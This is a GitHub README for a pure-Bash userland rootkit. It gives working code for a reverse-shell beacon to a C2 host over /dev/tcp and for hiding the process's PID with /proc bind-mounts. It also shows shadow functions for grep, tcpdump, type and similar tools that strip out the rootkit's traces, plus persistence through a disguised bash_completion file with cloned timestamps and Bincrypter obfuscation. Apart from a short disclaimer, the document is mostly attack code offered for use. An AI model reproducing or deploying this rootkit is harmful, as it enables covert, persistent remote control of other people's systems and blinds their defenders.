# bash-rootkit

> A pure-Bash userland rootkit built from Linux tips and tricks — no compiled binaries, no kernel modules. Persists as a reverse-shell beacon, hides its own PID, and shadows common system commands to blind the defender.

![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Security](https://img.shields.io/badge/Offensive_Security-ED1C24?style=for-the-badge&logo=kalilinux&logoColor=white)
![License](https://img.shields.io/badge/Educational_Only-blue?style=for-the-badge)

**[🌐 Full Visual README](https://JamesRiversTech.github.io/bash-rootkit)** &nbsp;·&nbsp;
**[💼 LinkedIn](https://www.linkedin.com/in/james-rivers-tech)** &nbsp;·&nbsp;
**[🔗 jamesrivers.tech](https://jamesrivers.tech/)**

---

## 📖 Overview

A fully self-contained userland rootkit written in pure Bash. No compiled code, no kernel exploits — everything runs in the shell itself.

The project has three layers:

| Layer | File | Purpose |
|-------|------|---------|
| 🔴 Beacon | `real_beacon` | Persistent reverse shell with PID hiding |
| 🟡 Functions | `final_functions` | Shadow functions that masquerade as real Linux commands |
| 🟢 Obfuscation | Bincrypter | Encrypts the final script for in-memory-only execution |

---

## 🏗️ Build Pipeline

Three stages turn readable Bash into a stealthy, opaque blob that never hits disk in cleartext.

```
[ Write Functions ] ──→ [ Hex-Encode via CyberChef ] ──→ [ Bincrypter Obfuscation ]
  final_functions           printf "\x..." lines              In-memory execution
```

**Step 1 — Write the shadow functions** in `final_functions`, overriding every common detection tool.

**Step 2 — Hex-encode via CyberChef** using the recipe:
[`To_Hex → Pad_lines with printf`](https://cyberchef.io/#recipe=To_Hex('%5C%5Cx',0)Pad_lines('Start',8,'printf%20%22'))
This encodes the functions into `printf "\x..."` lines so they can be embedded cleanly inside the beacon script.

**Step 3 — Obfuscate with THC Bincrypter**, making the script unreadable at rest and execution in-memory only.

---

## 📡 Beacon Script — `real_beacon`

The core loop. Hides its own PID using `/proc` bind-mounts, remounts `/proc` with `hidepid=2`, spoofs its process name to look like a kernel worker thread, then opens a raw TCP socket to the C2 operator.

```bash
# Remount /proc so other users can't enumerate PIDs
mount -o remount,hidepid=2 /proc 2>/dev/null
mtab $$   # bind-mount an empty dir over our own /proc/PID

while true; do
  (
    mtab $$ 2>/dev/null

    # Spoof process name as a kernel worker thread
    FAKE_NAME="[kworker/u$(shuf -i 0-5 -n 1):$(shuf -i 0-5 -n 1)]"

    if exec 5<>/dev/tcp/$IP/$PORT 2>/dev/null; then
      echo "\nHIDDEN SHELL: $(hostname) ($(whoami))\n" >&5
      echo 'while read -r line; do $line; done' \
        | exec -a "$FAKE_NAME" sh <&5 >&5 2>&5
    fi
  ) & disown

  ssleep   # sleep with its own hidden PID
done &>/dev/null
```

Cleanup is handled via a `trap` on `EXIT` / `SIGINT` / `SIGTERM` — unmounting all `/dev/shm` bind-mounts and killing background jobs so the operator can leave a clean slate on demand.

### PID Hiding — `mtab()`

The `mtab()` function is the core hiding primitive:

1. Ensures `/etc/mtab` isn't a symlink (which would log mount activity)
2. Creates a permanently empty, immutable directory at `/dev/shm/.mask`
3. Bind-mounts that empty directory over `/proc/<PID>` — making the process invisible to `ls /proc`, `ps`, and friends

---

## 🪞 Command Shadowing — `final_functions`

Every common detection tool is overridden with a Bash function that calls the real binary but pipes output through `grep -Ev "$_HG_P"` — stripping any line matching the rootkit's fingerprint pattern.

Tab-completion is preserved by checking `$COMP_LINE` and bypassing the filter during completions, so nothing feels broken to the user.

```bash
# Master filter pattern — every rootkit indicator in one variable
command export _HG_P="grep|ps|mount|4316|127.0.0.1|/proc/|hidepid|bash_|..."
```

### Shadowed Commands

| Command | Technique | What it hides |
|---------|-----------|---------------|
| `ls` | Bash fn + `-I` flags | Hidden files & empty `/proc` entries for masked PIDs |
| `ps` / `pgrep` / `top` / `htop` | Pattern-filtered output | Rootkit process names, IP, port |
| `grep` / `head` / `tail` / `cat` | Pipe through `grep -Ev $_HG_P` | Any line containing rootkit indicators |
| `mount` / `findmnt` | Output filter | `/proc` and `/dev/shm` bind-mounts |
| `tcpdump` | Auto-inject BPF filter | C2 IP and port from all captures |
| `lsof` / `strace` | Pattern-filtered output | Open FDs and syscalls related to the beacon |
| `set` / `declare` / `typeset` | AWK block-skip parser | Shadow function definitions from variable dumps |
| `env` / `printenv` / `export` | AWK + grep filter | `_HG_P` env var & `BASH_FUNC_*` exports |
| `type` / `which` | Hardcoded case statements | Returns fake binary paths for shadowed commands |
| `unset` / `builtin` | Re-source hook | Re-injects functions if someone tries to unset them |

```bash
# grep — filters its own output
grep() {
  [[ -n "$COMP_LINE" ]] && { /usr/bin/grep "$@"; return; }
  /usr/bin/grep "$@" | /usr/bin/grep -Ev "$_HG_P"
}

# tcpdump — auto-injects a BPF expression to hide C2 traffic
tcpdump() {
  local f="not port 4316 and not host 127.0.0.1"
  [[ $# -eq 0 ]] \
    && /usr/sbin/tcpdump -i any $f 2>/dev/null \
    || /usr/sbin/tcpdump "$@" and $f 2>/dev/null
}

# type / which — return fake paths so forensics look clean
type() {
  for a in "$@"; do
    case "$a" in
      grep|ps|mount|...) /usr/bin/echo "$a is /usr/bin/$a" ;;
      type|set|alias|...) /usr/bin/echo "$a is a shell builtin" ;;
      *) command builtin type "$a" 2>/dev/null ;;
    esac
  done
}
```

---

## 🔁 Persistence

The beacon drops a disguised file into `/etc/bash_completion.d/` named `policyeditor.bash` — a path that looks entirely legitimate and is sourced automatically by every new interactive shell. Timestamps are cloned from neighbouring system files to defeat simple time-based integrity checks.

```bash
FILE="/etc/bash_completion.d/policyeditor.bash"

if [[ ! -f "$FILE" ]]; then
  cat <<EOF > "$FILE"
  # <hex-encoded shadow functions embedded here>
EOF
  # Clone mtime from a real system file to avoid standing out
  touch -r /etc/bash_completion.d/javaws.bash "$FILE"
  touch -r /etc/sysconfig/ /etc/bash_completion.d/
  touch -r /opt/ /etc/
fi
```

---

## 🔒 Obfuscation — THC Bincrypter

After the beacon is finalized, it's passed through [THC's Bincrypter](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet). The result:

- **Unreadable at rest** — the script file looks like binary noise. `strings`, `cat`, and `file` reveal nothing useful.
- **In-memory execution** — the script self-decrypts into a `tmpfs`-backed memory region at runtime. No cleartext artifact ever touches disk.

---

## ⚠️ Disclaimer

This project is shared strictly for **educational and research purposes**. Understanding offensive techniques is essential for building robust defences. Do not deploy this on any system you do not own or have explicit written permission to test. The author assumes no liability for misuse.

---

<div align="center">

Made by **[James Rivers](https://jamesrivers.tech/)** &nbsp;·&nbsp; [LinkedIn](https://www.linkedin.com/in/james-rivers-tech)

</div>
